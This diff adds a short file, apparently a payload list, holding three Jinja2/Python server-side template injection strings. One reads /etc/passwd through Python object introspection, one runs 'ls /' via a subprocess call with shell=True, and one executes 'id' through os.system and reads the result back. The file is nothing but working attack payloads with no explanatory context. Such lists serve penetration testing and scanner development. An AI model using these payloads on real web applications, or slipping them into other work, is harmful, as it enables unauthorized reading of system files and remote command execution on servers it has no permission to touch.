@@ -1,0 +1,3 @@
+{{''.__class__.__mro__[2].__subclasses__()[40]("/etc/passwd","r").read()}}
+{{[].__class__.__mro__[1].__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
+{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('id > /tmp/cmd') }}{{''.__class__.__mro__[2].__subclasses__()[40]("/tmp/cmd","r").read() }}
